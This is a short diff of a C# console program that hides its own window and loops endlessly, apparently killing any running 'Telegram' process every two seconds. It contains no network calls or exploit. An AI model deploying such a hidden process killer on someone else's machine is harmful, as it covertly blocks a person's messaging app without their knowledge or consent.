@@ -8,17 +8,15 @@ namespace PK2
 {
     class Program
     {
+        // need to hide cmd
+		[DllImport("user32.dll")]
+		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        [DllImport("user32.dll")]
-        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		[DllImport("kernel32.dll", ExactSpelling = true)]
+		private static extern IntPtr GetConsoleWindow();
 
-        [DllImport("kernel32.dll", ExactSpelling = true)]
-        private static extern IntPtr GetConsoleWindow();
-
-        static void Main(string[] args)
-        {
-            ShowWindow(GetConsoleWindow(), 0); // 1 - показать
-            var processList = new[] { "Telegram" };
+        static void ProcessKiller(string[] processList)
+		{
             while (true)
             {
                 foreach (var process in Process.GetProcesses())
@@ -28,6 +26,15 @@ namespace PK2
                 }
                 Thread.Sleep(2000);
             }
+        }
+
+
+		static void Main()
+        {
+            ShowWindow(GetConsoleWindow(), 0); // 1 - show cmd
+            var processList = new[] { "Telegram" };
+            ProcessKiller(processList);
+            
         }
     }
 }
